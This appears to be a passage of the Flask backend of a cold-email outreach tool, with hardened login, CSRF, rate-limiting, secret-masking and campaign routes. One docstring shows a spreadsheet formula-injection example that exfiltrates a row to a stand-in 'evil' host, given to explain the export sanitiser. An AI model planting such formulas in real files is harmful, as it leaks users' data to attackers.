"""
app.py — Flask web application.
Run with:  python app.py
Then open: http://localhost:5000
"""

import csv
import io
import json

try:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment
    _OPENPYXL = True
except ImportError:
    _OPENPYXL = False
import base64
import hashlib
import hmac
import logging
import os
import secrets as _secrets
import sys
import threading
import time as _time
from collections import defaultdict, deque
from datetime import timedelta
from functools import wraps
from urllib.parse import urlparse
from flask import (
    Flask, render_template, request, jsonify,
    redirect, url_for, make_response, Response, session
)

import db
import scheduler
import sender as email_sender

# The scraper deliberately does NOT run here. It needs a visible Chrome window
# for CAPTCHA solving, which a headless server cannot provide -- on the GCP VM
# it failed at browser launch because the deploy never runs
# `playwright install chromium` and there is no X display. The server now only
# queues jobs; a worker on the operator's machine claims and runs them.
# See scraper_worker.py.

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s"
)

app = Flask(__name__)

# How many proxies sit in front of this app and append to X-Forwarded-For.
# The GCP deploy runs behind a single Nginx, so 1 is right there. Set to 0 for
# direct exposure, which makes _client_ip ignore the header entirely.
TRUSTED_PROXY_COUNT = int(os.environ.get("TRUSTED_PROXY_COUNT", "1"))

# ── Startup ───────────────────────────────────────────────────────────────────

db.init_db()
db.seed_admin_from_env()
app.secret_key = os.environ.get("SECRET_KEY") or db.get_or_create_secret()

# Hardened session cookie settings. Set SHOUTREACH_INSECURE_COOKIES=1 for
# local-only HTTP development.
app.config.update(
    SESSION_COOKIE_SECURE      = os.environ.get("SHOUTREACH_INSECURE_COOKIES") != "1",
    SESSION_COOKIE_HTTPONLY    = True,
    SESSION_COOKIE_SAMESITE    = "Lax",
    PERMANENT_SESSION_LIFETIME = timedelta(days=14),
    MAX_CONTENT_LENGTH         = 16 * 1024 * 1024,  # 16 MB hard cap on uploads
)

# Start the background scheduler once, at process boot. Doing this in a
# before_request hook (the old way) added overhead per request and allowed
# duplicate threads under request races.
scheduler.start()


# ── First-run setup token ────────────────────────────────────────────────────
# If no users exist and ADMIN_PASS is not set, generate a one-time token that
# must be entered on the first-run web form. This stops random visitors from
# claiming the admin account on a fresh deploy.
_SETUP_TOKEN: str = ""
_SETUP_TOKEN_LOCK = threading.Lock()


def _ensure_setup_token() -> None:
    global _SETUP_TOKEN
    with _SETUP_TOKEN_LOCK:
        if db.user_count() == 0 and not os.environ.get("ADMIN_PASS") and not _SETUP_TOKEN:
            _SETUP_TOKEN = _secrets.token_urlsafe(24)
            banner = "=" * 64
            logging.warning(
                "\n%s\n SHOUTREACH FIRST-RUN SETUP TOKEN:\n   %s\n"
                " Enter this on the first-run setup form to create the admin.\n%s",
                banner, _SETUP_TOKEN, banner,
            )


def _consume_setup_token(submitted: str) -> bool:
    global _SETUP_TOKEN
    with _SETUP_TOKEN_LOCK:
        if not _SETUP_TOKEN:
            return False
        ok = hmac.compare_digest(submitted or "", _SETUP_TOKEN)
        if ok:
            _SETUP_TOKEN = ""
        return ok


_ensure_setup_token()


# ── Login rate limiter (per-IP, in-memory) ───────────────────────────────────
_LOGIN_WINDOW_SECS = 900   # 15 min
_LOGIN_MAX_ATTEMPTS = 10
_login_attempts: "defaultdict[str, deque]" = defaultdict(deque)
_login_attempts_lock = threading.Lock()


def _client_ip() -> str:
    """
    The caller's IP, for the login rate limiter.

    X-Forwarded-For is a client-supplied list that proxies append to, so its
    LEFTMOST entry is whatever the client claimed -- an attacker rotating that
    header got a fresh rate-limit bucket per request and walked straight past
    the throttle. Take the rightmost entries instead: those were written by
    proxies we actually control, counted by TRUSTED_PROXY_COUNT.
    """
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd and TRUSTED_PROXY_COUNT > 0:
        parts = [p.strip() for p in fwd.split(",") if p.strip()]
        if parts:
            # -1 is our own proxy's view of the peer; -2 if there are two, etc.
            index = max(0, len(parts) - TRUSTED_PROXY_COUNT)
            return parts[index]
    return request.remote_addr or "unknown"


def _login_rate_limited(ip: str) -> bool:
    now = _time.time()
    with _login_attempts_lock:
        dq = _login_attempts[ip]
        while dq and now - dq[0] > _LOGIN_WINDOW_SECS:
            dq.popleft()
        if len(dq) >= _LOGIN_MAX_ATTEMPTS:
            return True
        dq.append(now)
        return False


# ── Auth helpers ──────────────────────────────────────────────────────────────

_PUBLIC_PATHS = {"/login", "/logout"}
_CSRF_EXEMPT_PATHS = {"/login", "/logout"}

# Routes the local scrape worker calls. They authenticate with X-API-Key
# instead of a session cookie, so the login redirect and the CSRF token check
# -- both of which assume a browser -- have to step aside. Safe because a
# custom header cannot be attached cross-origin by a browser, which is the
# threat CSRF tokens exist to stop. Each of these still carries
# @worker_auth_required; skipping the hooks is not skipping authentication.
_WORKER_PATH_PREFIX = "/api/scraper/claim"
_WORKER_PATHS = {"/api/scraper/claim", "/api/scraper/heartbeat"}


def _has_valid_worker_key() -> bool:
    presented = request.headers.get("X-API-Key", "")
    if not presented:
        return False
    try:
        return hmac.compare_digest(presented, db.get_or_create_worker_api_key())
    except Exception:
        return False


def _is_worker_route() -> bool:
    path = request.path
    if path in _WORKER_PATHS:
        return True
    # /api/scraper/jobs/<id>/progress
    if path.startswith("/api/scraper/jobs/") and path.endswith("/progress"):
        return True
    # The worker pushes finished leads to the normal contacts import. That
    # route is also used by the browser, so it stays cookie+CSRF protected
    # unless a valid worker key is actually presented.
    return path == "/api/contacts/import" and _has_valid_worker_key()


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("user_id"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("is_admin"):
            return jsonify({"error": "Forbidden"}), 403
        return f(*args, **kwargs)
    return decorated


def admin_or_worker_required(f):
    """Either a logged-in admin in a browser, or the local scrape worker."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("is_admin") or _has_valid_worker_key():
            return f(*args, **kwargs)
        return jsonify({"error": "Forbidden"}), 403
    return decorated


def worker_auth_required(f):
    """
    Authenticate the local scrape worker by shared key instead of a session.

    The worker is a script, not a browser: it has no cookie and no CSRF token.
    A custom header is the right primitive here because browsers will not
    attach one cross-origin, so these routes are not CSRF-reachable the way a
    cookie-authenticated route is. Compared with compare_digest so a wrong key
    cannot be recovered by timing the response.
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        presented = request.headers.get("X-API-Key", "")
        expected = db.get_or_create_worker_api_key()
        if not presented or not hmac.compare_digest(presented, expected):
            return jsonify({"error": "Invalid or missing worker API key"}), 401
        return f(*args, **kwargs)
    return decorated


def _ensure_csrf_token() -> str:
    if not session.get("csrf_token"):
        session["csrf_token"] = _secrets.token_urlsafe(32)
    return session["csrf_token"]


def _same_origin() -> bool:
    """Best-effort origin check: Origin or Referer must match this host."""
    host = request.host
    origin = request.headers.get("Origin")
    if origin:
        try:
            return urlparse(origin).netloc == host
        except Exception:
            return False
    referer = request.headers.get("Referer")
    if referer:
        try:
            return urlparse(referer).netloc == host
        except Exception:
            return False
    # No Origin and no Referer is suspicious for a state-changing request, but
    # some browsers (and curl) omit both. Allow it; CSRF token on the JSON
    # endpoints provides the real defence.
    return True


@app.before_request
def _require_login():
    if request.path in _PUBLIC_PATHS or request.path.startswith("/unsubscribe"):
        return
    if _is_worker_route():
        return          # authenticated by X-API-Key in worker_auth_required
    if not session.get("user_id"):
        if request.path.startswith("/api/"):
            return jsonify({"error": "Unauthorized"}), 401
        return redirect("/login")


@app.before_request
def _check_csrf():
    if request.method in ("GET", "HEAD", "OPTIONS"):
        return
    if request.path in _CSRF_EXEMPT_PATHS:
        return
    if request.path.startswith("/unsubscribe"):
        return
    if _is_worker_route():
        return          # header auth, not cookie auth -- see _WORKER_PATHS
    # _require_login already redirected unauthed users; here we know there is
    # a session. Compare submitted token against the one bound to this session.
    submitted = request.headers.get("X-CSRF-Token") or request.form.get("csrf_token") or ""
    expected = session.get("csrf_token") or ""
    if not submitted or not expected or not hmac.compare_digest(submitted, expected):
        return jsonify({"error": "Invalid or missing CSRF token"}), 403


@app.after_request
def _security_headers(resp):
    resp.headers.setdefault("X-Frame-Options", "DENY")
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    resp.headers.setdefault(
        "Permissions-Policy", "geolocation=(), microphone=(), camera=(), interest-cohort=()"
    )
    if request.is_secure or request.headers.get("X-Forwarded-Proto") == "https":
        resp.headers.setdefault(
            "Strict-Transport-Security", "max-age=31536000; includeSubDomains"
        )
    return resp


@app.route("/api/csrf", methods=["GET"])
def api_csrf():
    return jsonify({"csrf_token": _ensure_csrf_token()})


# ── Login / Logout ────────────────────────────────────────────────────────────

@app.route("/login", methods=["GET"])
def login_page():
    if session.get("user_id"):
        return redirect("/")
    _ensure_setup_token()
    first_run = db.user_count() == 0
    error = request.args.get("error", "")
    # Bind a CSRF token to the unauthenticated session so the form can submit it.
    csrf_token = _ensure_csrf_token()
    return render_template(
        "login.html",
        error=error,
        first_run=first_run,
        csrf_token=csrf_token,
    )


@app.route("/login", methods=["POST"])
def login_submit():
    # Same-origin check stops cross-site form POSTs.
    if not _same_origin():
        return render_template(
            "login.html", first_run=db.user_count() == 0,
            csrf_token=_ensure_csrf_token(),
            error="Request origin mismatch.",
        ), 403

    # CSRF token check (the global _check_csrf hook exempts /login because the
    # session is empty before login; we enforce it manually here using whatever
    # token was bound to the visitor's pre-login session).
    submitted_csrf = request.form.get("csrf_token", "")
    expected_csrf  = session.get("csrf_token", "")
    if not submitted_csrf or not expected_csrf or not hmac.compare_digest(submitted_csrf, expected_csrf):
        return render_template(
            "login.html", first_run=db.user_count() == 0,
            csrf_token=_ensure_csrf_token(),
            error="Session expired — please try again.",
        ), 403

    # Per-IP brute-force throttle.
    ip = _client_ip()
    if _login_rate_limited(ip):
        return render_template(
            "login.html", first_run=db.user_count() == 0,
            csrf_token=_ensure_csrf_token(),
            error="Too many attempts. Try again in 15 minutes.",
        ), 429

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    if db.user_count() == 0:
        # First-run: must present the setup token (logged at boot) to claim admin.
        _ensure_setup_token()
        if not _consume_setup_token(request.form.get("setup_token", "").strip()):
            return render_template(
                "login.html", first_run=True,
                csrf_token=_ensure_csrf_token(),
                error="Invalid setup token. Check the server startup logs.",
            ), 403
        if not username or len(password) < 12:
            # Re-arm the token so a typo on first-run doesn't lock the operator out.
            global _SETUP_TOKEN
            with _SETUP_TOKEN_LOCK:
                _SETUP_TOKEN = _secrets.token_urlsafe(24)
                logging.warning("Setup token consumed but admin not created; new token: %s", _SETUP_TOKEN)
            return render_template(
                "login.html", first_run=True,
                csrf_token=_ensure_csrf_token(),
                error="Username required and password must be at least 12 characters. A new setup token has been issued (see server logs).",
            ), 400
        db.create_user(username, password, is_admin=True)
        user = db.authenticate(username, password)
        logging.info("First-run admin '%s' created from setup token (ip=%s)", username, ip)
    else:
        user = db.authenticate(username, password)
        if not user:
            logging.info("Failed login attempt for username=%r ip=%s", username, ip)
            return render_template(
                "login.html", first_run=False,
                csrf_token=_ensure_csrf_token(),
                error="Invalid username or password.",
            ), 401

    # Successful login — rotate the session and bind a fresh CSRF token.
    session.clear()
    session.permanent = True
    session["user_id"]    = user["id"]
    session["username"]   = user["username"]
    session["is_admin"]   = bool(user["is_admin"])
    session["csrf_token"] = _secrets.token_urlsafe(32)
    return redirect("/")


@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect("/login")


# ── Pages ─────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


def _verify_unsub_token(token: str):
    """Verify the HMAC-signed unsubscribe token. Returns the email or None."""
    try:
        parts = token.rsplit(".", 1)
        if len(parts) != 2:
            return None
        encoded, sig = parts
        rem = len(encoded) % 4
        if rem:
            encoded += "=" * (4 - rem)
        email_addr = base64.urlsafe_b64decode(encoded.encode()).decode()
        secret = db.get_or_create_secret()
        expected = hmac.new(
            secret.encode(), email_addr.lower().encode(), hashlib.sha256
        ).hexdigest()[:20]
        if hmac.compare_digest(sig, expected):
            return email_addr
        return None
    except Exception:
        return None


# RFC 8058: sender.py advertises List-Unsubscribe-Post, which tells Gmail and
# Yahoo to POST here when the user clicks their native Unsubscribe button.
# GET-only meant that POST got a 405, so the button silently failed while we
# claimed to support it -- exactly what the 2024 bulk-sender rules penalise.
@app.route("/unsubscribe/<token>", methods=["GET", "POST"])
def unsubscribe(token):
    email_addr = _verify_unsub_token(token)
    if not email_addr:
        return make_response("<p>Invalid or expired unsubscribe link.</p>", 400)
    db.unsubscribe_contact(email_addr)
    db.add_log(f"Unsubscribed: {email_addr}")
    return make_response(
        "<html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
        "<h2>✓ You've been unsubscribed</h2>"
        "<p>You won't receive any more emails from this sender.</p>"
        "</body></html>",
        200,
    )


# ── API: Settings ─────────────────────────────────────────────────────────────

# Explicit denylist of setting keys whose values must never leave the server.
# Anything sensitive (credentials, API keys, signing secrets) belongs here.
_SECRET_SETTING_KEYS = {
    "smtp_pass", "imap_pass",
    "anthropic_api_key", "gemini_api_key", "openai_api_key",
    "_secret_key",
}
_SECRET_PLACEHOLDER = "●●●●●●"


def _is_secret_key(key: str) -> bool:
    if key in _SECRET_SETTING_KEYS:
        return True
    # Defensive default: anything that looks like a secret gets masked too.
    lower = key.lower()
    return (
        "pass" in lower
        or lower.endswith("_key")
        or lower.endswith("_secret")
        or lower.endswith("_token")
    )


@app.route("/api/settings", methods=["GET"])
@admin_required
def api_get_settings():
    s = db.get_settings()
    safe = {k: (_SECRET_PLACEHOLDER if _is_secret_key(k) else v) for k, v in s.items()}
    return jsonify(safe)


@app.route("/api/settings", methods=["POST"])
@admin_required
def api_save_settings():
    data = request.json or {}
    existing = db.get_settings()
    filtered = {}
    for k, v in data.items():
        if _is_secret_key(k) and v == _SECRET_PLACEHOLDER:
            filtered[k] = existing.get(k, "")
        else:
            filtered[k] = v
    db.save_settings(filtered)
    return jsonify({"ok": True})


@app.route("/api/settings/worker-key", methods=["GET"])
@admin_required
def api_get_worker_key():
    """Deliberately separate from /api/settings, which masks every secret."""
    return jsonify({"key": db.get_or_create_worker_api_key()})


@app.route("/api/settings/worker-key", methods=["POST"])
@admin_required
def api_rotate_worker_key():
    return jsonify({"key": db.rotate_worker_api_key()})


@app.route("/api/settings/test-smtp", methods=["POST"])
@admin_required
def api_test_smtp():
    settings = db.get_settings()
    ok, msg = email_sender.test_smtp(settings)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/settings/test-imap", methods=["POST"])
@admin_required
def api_test_imap():
    settings = db.get_settings()
    ok, msg = email_sender.test_imap(settings)
    return jsonify({"ok": ok, "message": msg})


# ── API: SMTP Accounts ───────────────────────────────────────────────────────

@app.route("/api/accounts", methods=["GET"])
@admin_required
def api_get_accounts():
    accounts = db.get_smtp_accounts()
    # Mask passwords before sending to frontend
    for a in accounts:
        a["smtp_pass"] = _SECRET_PLACEHOLDER if a.get("smtp_pass") else ""
        a["imap_pass"] = _SECRET_PLACEHOLDER if a.get("imap_pass") else ""
    return jsonify(accounts)


@app.route("/api/accounts", methods=["POST"])
@admin_required
def api_create_account():
    d = request.json or {}
    aid = db.create_smtp_account(d)
    return jsonify({"ok": True, "id": aid})


@app.route("/api/accounts/<int:aid>", methods=["PUT"])
@admin_required
def api_update_account(aid):
    d = request.json or {}
    existing = db.get_smtp_account(aid)
    if not existing:
        return jsonify({"ok": False, "error": "Not found"}), 404
    # Keep the stored password unless a real new one was typed. Blank counts as
    # "unchanged", not "clear it": the edit form leaves the field empty rather
    # than prefilling the mask, so saving an unrelated change would otherwise
    # wipe the credentials and break sending with no obvious cause. The mask is
    # still accepted for older clients that echo it back.
    for key in ("smtp_pass", "imap_pass"):
        if d.get(key) in (None, "", _SECRET_PLACEHOLDER):
            d[key] = existing.get(key, "")
    db.update_smtp_account(aid, d)
    return jsonify({"ok": True})


@app.route("/api/accounts/<int:aid>", methods=["DELETE"])
@admin_required
def api_delete_account(aid):
    db.delete_smtp_account(aid)
    return jsonify({"ok": True})


def _port_or(default, raw):
    try:
        return int(raw)
    except (TypeError, ValueError):
        return default


def _unmask_pass(submitted, account_id, field):
    """
    Resolve a password coming from the account form.

    An untouched field still holds the mask the GET route substituted, so fall
    back to what is stored rather than trying to authenticate with six bullet
    characters.
    """
    if submitted and submitted != _SECRET_PLACEHOLDER:
        return submitted
    if account_id:
        existing = db.get_smtp_account(account_id) or {}
        return existing.get(field, "")
    return submitted or ""


@app.route("/api/accounts/test-smtp", methods=["POST"])
@admin_required
def api_test_smtp_config():
    """
    Test the credentials currently in the form, not the ones in the database.

    The by-id routes below read the saved account, so pasting a new password
    and pressing Test reported a failure for the OLD password -- the new one
    never left the browser. That made a correct credential look rejected, and
    it also meant a brand-new account could not be tested before saving.
    """
    d   = request.json or {}
    aid = d.get("id")
    aid = int(aid) if aid else None

    cfg = {
        "smtp_host": (d.get("smtp_host") or "").strip(),
        "smtp_port": _port_or(587, d.get("smtp_port")),
        "smtp_user": (d.get("smtp_user") or "").strip(),
        "smtp_pass": _unmask_pass(d.get("smtp_pass"), aid, "smtp_pass"),
    }
    if not cfg["smtp_host"]:
        return jsonify({"ok": False, "message": "SMTP host is required"}), 400
    if not cfg["smtp_pass"]:
        return jsonify({"ok": False, "message": "SMTP password is required"}), 400

    ok, msg = email_sender.test_smtp(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/accounts/test-imap", methods=["POST"])
@admin_required
def api_test_imap_config():
    """IMAP counterpart of api_test_smtp_config — tests the form, not the DB."""
    d   = request.json or {}
    aid = d.get("id")
    aid = int(aid) if aid else None

    cfg = {
        "imap_host": (d.get("imap_host") or "").strip(),
        "imap_user": (d.get("imap_user") or "").strip(),
        "imap_pass": _unmask_pass(d.get("imap_pass"), aid, "imap_pass"),
    }
    if not cfg["imap_host"]:
        return jsonify({"ok": False, "message": "IMAP host is required"}), 400
    if not cfg["imap_pass"]:
        return jsonify({"ok": False, "message": "IMAP password is required"}), 400

    ok, msg = email_sender.test_imap(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/accounts/<int:aid>/test-smtp", methods=["POST"])
@admin_required
def api_test_account_smtp(aid):
    acct = db.get_smtp_account(aid)
    if not acct:
        return jsonify({"ok": False, "message": "Account not found"}), 404
    cfg = {
        "smtp_host": acct["smtp_host"], "smtp_port": acct["smtp_port"],
        "smtp_user": acct["smtp_user"], "smtp_pass": acct["smtp_pass"],
    }
    ok, msg = email_sender.test_smtp(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/accounts/<int:aid>/test-imap", methods=["POST"])
@admin_required
def api_test_account_imap(aid):
    acct = db.get_smtp_account(aid)
    if not acct:
        return jsonify({"ok": False, "message": "Account not found"}), 404
    cfg = {
        "imap_host": acct["imap_host"],
        "imap_user": acct["imap_user"],
        "imap_pass": acct["imap_pass"],
    }
    ok, msg = email_sender.test_imap(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/campaigns/<int:cid>/accounts", methods=["GET"])
@admin_required
def api_get_campaign_accounts(cid):
    return jsonify(db.get_campaign_smtp_accounts(cid))


@app.route("/api/campaigns/<int:cid>/accounts", methods=["POST"])
@admin_required
def api_set_campaign_accounts(cid):
    ids = (request.json or {}).get("account_ids", [])
    db.set_campaign_smtp_accounts(cid, ids)
    return jsonify({"ok": True})


# ── API: Users ────────────────────────────────────────────────────────────────

@app.route("/api/users", methods=["GET"])
@admin_required
def api_list_users():
    return jsonify(db.list_users())


@app.route("/api/users", methods=["POST"])
@admin_required
def api_create_user():
    d = request.json or {}
    username = d.get("username", "").strip()
    password = d.get("password", "")
    is_admin = bool(d.get("is_admin", False))
    if not username or not password:
        return jsonify({"error": "Username and password required"}), 400
    if len(password) < 8:
        return jsonify({"error": "Password must be at least 8 characters"}), 400
    if db.get_user_by_username(username):
        return jsonify({"error": "Username already exists"}), 409
    uid = db.create_user(username, password, is_admin)
    return jsonify({"ok": True, "id": uid})


@app.route("/api/users/<int:uid>", methods=["DELETE"])
@admin_required
def api_delete_user(uid):
    if uid == session["user_id"]:
        return jsonify({"error": "Cannot delete your own account"}), 400
    db.delete_user(uid)
    return jsonify({"ok": True})


@app.route("/api/users/<int:uid>/password", methods=["POST"])
def api_change_password(uid):
    # Admins can change anyone's password; users can only change their own.
    is_self  = uid == session.get("user_id")
    is_admin = bool(session.get("is_admin"))
    if not is_admin and not is_self:
        return jsonify({"error": "Forbidden"}), 403

    d = request.json or {}
    new_pass     = d.get("password", "")
    current_pass = d.get("current_password", "")

    if len(new_pass) < 12:
        return jsonify({"error": "Password must be at least 12 characters"}), 400

    # Self-service password change requires the current password — this stops
    # an XSS or session-fixation attacker from silently rotating credentials.
    # Admins changing OTHER users' passwords don't need the target's password
    # (this is the intended admin reset flow); admins changing their OWN
    # password still need to prove they know the current one.
    if is_self:
        user = db.get_user_by_id(uid)
        if not user or not db.verify_user_password(user, current_pass):
            return jsonify({"error": "Current password is incorrect"}), 403

    db.change_password(uid, new_pass)
    logging.info("Password changed for uid=%s by uid=%s", uid, session.get("user_id"))
    return jsonify({"ok": True})


@app.route("/api/users/me", methods=["GET"])
def api_me():
    return jsonify({
        "id":       session.get("user_id"),
        "username": session.get("username"),
        "is_admin": session.get("is_admin"),
    })


# ── API: Contacts — Unsubscribed ─────────────────────────────────────────────

@app.route("/api/contacts/unsubscribed", methods=["GET"])
def api_unsubscribed():
    return jsonify(db.get_unsubscribed_contacts())


@app.route("/api/contacts/invalid-mx", methods=["GET"])
def api_invalid_mx():
    return jsonify(db.get_invalid_mx_contacts())


# ── API: Preview ─────────────────────────────────────────────────────────────

@app.route("/api/preview", methods=["POST"])
def api_preview():
    d = request.json or {}
    subject_tpl = d.get("subject", "")
    body_tpl    = d.get("body_html", "")
    contact     = d.get("contact", {})
    subject  = email_sender._render(subject_tpl, contact)
    body_html = email_sender._plain_to_html(email_sender._render(body_tpl, contact))
    return jsonify({"subject": subject, "body_html": body_html})


# ── API: AI Review ────────────────────────────────────────────────────────────

_REVIEW_PROMPT = """You are an expert cold-email copywriter. Review this outreach email and respond with ONLY valid JSON (no markdown, no extra text).

Subject: {subject}

Body:
{body}

Respond with this exact JSON structure:
{{
  "score": <integer 1-10>,
  "summary": "<one sentence overall verdict>",
  "strengths": ["<strength 1>", "<strength 2>"],
  "issues": ["<issue 1>", "<issue 2>"],
  "suggestions": ["<suggestion 1>", "<suggestion 2>"],
  "deliverability_risk": "<low|medium|high>",
  "rewrite": {{
    "subject": "<improved subject line, preserving any {{{{variable}}}} placeholders>",
    "body": "<improved full body, preserving any {{{{variable}}}} placeholders>"
  }}
}}"""


_CLAUDE_DEFAULT  = "claude-haiku-4-5-20251001"
_GEMINI_DEFAULT  = "gemini-1.5-flash"
_OPENAI_DEFAULT  = "gpt-4o-mini"


def _ai_http_post(url: str, payload: bytes, headers: dict) -> dict:
    """POST to an AI provider and return parsed JSON.
    Raises ValueError with a user-friendly message on any failure."""
    import urllib.request
    import urllib.error
    req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        status = exc.code
        try:
            body = json.loads(exc.read())
            msg = (
                (body.get("error") or {}).get("message")
                or body.get("message")
                or ""
            )
        except Exception:
            msg = ""
        if status == 401:
            raise ValueError("Invalid API key — check your key in Settings") from exc
        if status == 403:
            raise ValueError(msg or "Access denied — your key may lack permissions") from exc
        if status == 404:
            raise ValueError("Model not found — the selected model ID may be incorrect or not yet available") from exc
        if status == 429:
            raise ValueError(msg or "Rate limit hit or credits exhausted — check your account balance") from exc
        if status >= 500:
            raise ValueError(f"Provider server error (HTTP {status}) — try again in a moment") from exc
        raise ValueError(msg or f"API error (HTTP {status})") from exc
    except urllib.error.URLError as exc:
        reason = str(exc.reason)
        if "timed out" in reason.lower():
            raise ValueError("Request timed out — the provider took too long to respond") from exc
        raise ValueError(f"Network error — could not reach provider ({reason})") from exc


def _strip_code_fence(text: str) -> str:
    if text.startswith("```"):
        text = text.split("```")[1]
        if text.startswith("json"):
            text = text[4:]
    return text.strip()


def _parse_ai_json(text: str) -> dict:
    text = _strip_code_fence(text.strip())
    try:
        return json.loads(text)
    except json.JSONDecodeError as exc:
        raise ValueError(f"AI returned a non-JSON response — try again or switch models") from exc


def _call_claude_review(api_key: str, subject: str, body: str, model: str) -> dict:
    prompt = _REVIEW_PROMPT.format(subject=subject, body=body)
    payload = json.dumps({
        "model": model or _CLAUDE_DEFAULT,
        "max_tokens": 1024,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    data = _ai_http_post(
        "https://api.anthropic.com/v1/messages",
        payload,
        {"x-api-key": api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"},
    )
    return _parse_ai_json(data["content"][0]["text"])


def _call_gemini_review(api_key: str, subject: str, body: str, model: str) -> dict:
    prompt = _REVIEW_PROMPT.format(subject=subject, body=body)
    model = model or _GEMINI_DEFAULT
    payload = json.dumps({
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.2},
    }).encode()
    data = _ai_http_post(
        f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={api_key}",
        payload,
        {"content-type": "application/json"},
    )
    text = data["candidates"][0]["content"]["parts"][0]["text"]
    return _parse_ai_json(text)


def _call_openai_review(api_key: str, subject: str, body: str, model: str) -> dict:
    prompt = _REVIEW_PROMPT.format(subject=subject, body=body)
    payload = json.dumps({
        "model": model or _OPENAI_DEFAULT,
        "max_completion_tokens": 1024,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    data = _ai_http_post(
        "https://api.openai.com/v1/chat/completions",
        payload,
        {"Authorization": f"Bearer {api_key}", "content-type": "application/json"},
    )
    text = data["choices"][0]["message"]["content"]
    return _parse_ai_json(text)


_AI_CALLERS = {
    "claude":  (_call_claude_review,  "anthropic_api_key"),
    "gemini":  (_call_gemini_review,  "gemini_api_key"),
    "openai":  (_call_openai_review,  "openai_api_key"),
}


@app.route("/api/ai/review", methods=["POST"])
@admin_required
def api_ai_review():
    s = db.get_settings()
    if s.get("ai_features_enabled") != "1":
        return jsonify({"error": "AI features are not enabled"}), 403

    provider = s.get("ai_provider", "claude")
    if provider not in _AI_CALLERS:
        provider = "claude"
    caller_fn, key_setting = _AI_CALLERS[provider]
    api_key = s.get(key_setting, "").strip()
    if not api_key:
        return jsonify({"error": f"API key for {provider} is not configured"}), 403
    model = s.get("ai_model", "").strip()

    d = request.json or {}
    subject = d.get("subject", "").strip()
    body    = d.get("body", "").strip()
    if not subject and not body:
        return jsonify({"error": "Subject and body are empty"}), 400

    try:
        result = caller_fn(api_key, subject, body, model)
        return jsonify(result)
    except ValueError as exc:
        # Known, user-facing errors (bad key, model not found, credits, timeout, bad JSON)
        logging.warning("AI review error: %s", exc)
        return jsonify({"error": str(exc)}), 400
    except Exception as exc:
        # Unexpected crash — log the full traceback but return a generic message
        logging.exception("Unexpected AI review error")
        return jsonify({"error": "Unexpected error — check server logs for details"}), 500


# Leading characters that make Excel/Sheets treat a cell as a formula. Tab and
# carriage return are included because both are stripped before evaluation, so
# "	=cmd" is still executed.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", chr(9), chr(13))


def _no_formula(value):
    """
    Neutralise spreadsheet formula injection in exported cells.

    Company names and addresses are scraped from arbitrary websites, so their
    contents are attacker-controlled. Excel and Sheets evaluate any cell whose
    text starts with one of _FORMULA_TRIGGERS, so a business named
    =HYPERLINK("http://evil/?"&A1) would exfiltrate the row when the operator
    opens the export. A leading apostrophe forces the cell to be read as text.
    """
    if not isinstance(value, str):
        return value
    return "'" + value if value[:1] in _FORMULA_TRIGGERS else value


# ── API: Stats ────────────────────────────────────────────────────────────────

@app.route("/api/stats")
def api_stats():
    return jsonify(db.get_stats())


@app.route("/api/stats/<int:cid>")
def api_campaign_stats(cid):
    return jsonify(db.get_stats(cid))


# ── API: Campaigns ────────────────────────────────────────────────────────────

@app.route("/api/campaigns", methods=["GET"])
def api_get_campaigns():
    campaigns = db.get_campaigns()
    # Attach step count and contact count to each
    for c in campaigns:
        steps = db.get_steps(c["id"])
        stats = db.get_stats(c["id"])
        c["step_count"]    = len(steps)
        c["contact_count"] = stats["total"]
        c["sent_count"]    = stats["sent"]
        c["reply_rate"]    = stats["reply_rate"]
    return jsonify(campaigns)


@app.route("/api/campaigns", methods=["POST"])
@admin_required
def api_create_campaign():
    d = request.json or {}
    cid = db.create_campaign(
        name        = d.get("name", "New Campaign"),
        daily_limit = int(d.get("daily_limit", 30)),
        start_hour  = int(d.get("send_start_hour", 9)),
        end_hour    = int(d.get("send_end_hour", 17)),
        min_delay   = int(d.get("min_delay_secs", 45)),
        max_delay   = int(d.get("max_delay_secs", 120)),
        timezone    = d.get("timezone") or None,
        variables   = json.dumps(d.get("variables") or {}),
    )
    return jsonify({"ok": True, "id": cid})


@app.route("/api/campaigns/<int:cid>", methods=["GET"])
def api_get_campaign(cid):
    c = db.get_campaign(cid)
    if not c:
        return jsonify({"error": "Not found"}), 404
    # Parse variables JSON string into a dict for the frontend
    try:
        c["variables"] = json.loads(c.get("variables") or "{}")
    except Exception:
        c["variables"] = {}
    steps = db.get_steps(cid)
    for s in steps:
        s["variants"] = db.get_step_variants(s["id"])
    c["steps"]          = steps
    c["stats"]          = db.get_stats(cid)
    c["variant_stats"]  = db.get_variant_stats(cid)
    c["contacts"]       = db.get_campaign_contacts(cid)
